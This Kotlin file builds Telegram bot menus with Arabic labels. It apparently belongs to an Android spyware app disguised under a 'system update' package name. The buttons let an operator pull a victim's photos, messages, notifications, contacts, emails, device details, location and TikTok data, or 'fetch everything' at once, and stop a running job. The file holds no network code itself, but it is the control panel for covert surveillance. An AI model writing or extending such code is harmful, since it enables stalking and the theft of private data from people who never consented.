package com.sys.update

import org.json.JSONArray
import org.json.JSONObject

object KeyboardBuilder {

    /**
     * قائمة الأزرار الرئيسية (Reply Keyboard — أسفل الشاشة)
     */
    fun replyKeyboard(): JSONObject {
        val keyboard = JSONArray()

        // الصف 1: الصور
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📸 كل الصور"))
            put(JSONObject().put("text", "📸 آخر 50"))
        })

        // الصف 2: الرسائل والإشعارات
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📩 كل الرسائل"))
            put(JSONObject().put("text", "🔔 الإشعارات"))
        })

        // الصف 3: جهات الاتصال والإيميلات
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "👥 جهات الاتصال"))
            put(JSONObject().put("text", "📧 الإيميلات"))
        })

        // الصف 4: الجهاز والموقع
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "📊 معلومات الجهاز"))
            put(JSONObject().put("text", "📍 الموقع"))
        })

        // الصف 5: تيك توك
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🎵 تيك توك"))
        })

        // الصف 6: جلب شامل
        keyboard.put(JSONArray().apply {
            put(JSONObject().put("text", "🚀 جلب كل شي"))
        })

        return JSONObject().apply {
            put("keyboard", keyboard)
            put("resize_keyboard", true)
            put("one_time_keyboard", false)
            put("is_persistent", true)
        }
    }

    fun backToMenu(): JSONObject = replyKeyboard()

    fun stopJob(jobId: String): JSONObject {
        val rows = JSONArray()
        rows.put(JSONArray().apply {
            put(JSONObject().put("text", "🛑 إيقاف العملية").put("callback_data", "stop_$jobId"))
        })
        return JSONObject().apply { put("inline_keyboard", rows) }
    }
}
